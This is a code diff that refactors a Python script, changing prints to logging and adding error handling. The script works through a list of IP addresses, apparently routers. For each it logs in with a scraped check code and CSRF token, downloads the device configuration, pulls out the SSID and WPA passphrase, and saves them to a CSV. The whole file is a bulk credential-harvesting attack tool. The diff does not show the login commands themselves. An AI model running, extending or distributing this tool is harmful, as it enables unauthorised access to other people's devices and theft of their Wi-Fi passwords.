@@ -1,10 +1,10 @@
 import os
-import requests
 import re
 import subprocess
 import csv
 import xml.etree.ElementTree as ET
 import logging
+import requests
 
 logging.basicConfig(level=logging.INFO)
 
@@ -39,7 +39,7 @@ def send_login(ip, code, csrf):
     try:
         subprocess.run(login_command, check=True)
     except subprocess.CalledProcessError as e:
-        print(f"Failed to send login request to {ip}: {e}")
+        logging.error(f"Failed to send login request to {ip}: {e}")
 
 
 def download_conf(ip, csrf):
@@ -74,7 +74,7 @@ def download_conf(ip, csrf):
     try:
         subprocess.run(download_command, check=True)
     except subprocess.CalledProcessError as e:
-        print(f"Failed to download configuration file from {ip}: {e}")
+        logging.error(f"Failed to download configuration file from {ip}: {e}")
 
 
 def get_ip_list(file_path):
@@ -101,39 +101,33 @@ def process_ips(ip_list, timeout):
             csrf_token_value = csrf_token_match.group(1) if csrf_token_match else None
             send_login(ip, check_code_value, csrf_token_value)
             download_conf(ip, csrf_token_value)
-            # For Debugging - Disabled by default
-            # send_logout(ip)
 
-        except requests.exceptions.ConnectionError as e:
-            print(f"Failed to connect to {ip}: {str(e)}")
-        continue
+        except requests.exceptions.RequestException as e:
+            logging.error(f"Failed to process {ip}: {e}")
+            continue
 
 
 def parse_xml_files(directory):
     ssid_key_pairs = []
 
-    # Iterate over all files in the directory
     for filename in os.listdir(directory):
         if filename.endswith(".xml"):
             file_path = os.path.join(directory, filename)
 
-            # Parse the XML file
-            tree = ET.parse(file_path)
-            root = tree.getroot()
+            try:
+                tree = ET.parse(file_path)
+                root = tree.getroot()
 
-            # Find the SSID and KeyPassphrase elements
-            ssid_element = root.find(".//Value[@Name='ssid']")
-            keypassphrase_element = root.find(".//Value[@Name='WLAN_WPA_PSK']")
+                ssid_element = root.find(".//Value[@Name='ssid']")
+                keypassphrase_element = root.find(".//Value[@Name='WLAN_WPA_PSK']")
 
-            # Extract the values if elements are found
-            if ssid_element is not None and keypassphrase_element is not None:
-                ssid = ssid_element.attrib["Value"]
-                keypassphrase = keypassphrase_element.attrib["Value"]
-
-                # Extract the IP address from the filename
-                ip = filename.replace(".xml", "")
-
-                ssid_key_pairs.append((ip, ssid, keypassphrase))
+                if ssid_element is not None and keypassphrase_element is not None:
+                    ssid = ssid_element.attrib.get("Value", "")
+                    keypassphrase = keypassphrase_element.attrib.get("Value", "")
+                    ip = filename.replace(".xml", "")
+                    ssid_key_pairs.append((ip, ssid, keypassphrase))
+            except ET.ParseError as e:
+                logging.error(f"Error parsing XML file {file_path}: {e}")
 
     return ssid_key_pairs
 
@@ -141,10 +135,8 @@ def parse_xml_files(directory):
 def save_to_csv(pairs, output_file):
     with open(output_file, "w", newline="") as file:
         writer = csv.writer(file)
-        writer.writerow(["IP", "SSID", "KeyPassphrase"])  # Write header
-
-        for ip, ssid, keypassphrase in pairs:
-            writer.writerow([ip, ssid, keypassphrase])
+        writer.writerow(["IP", "SSID", "KeyPassphrase"])
+        writer.writerows(pairs)
 
 
 def main():
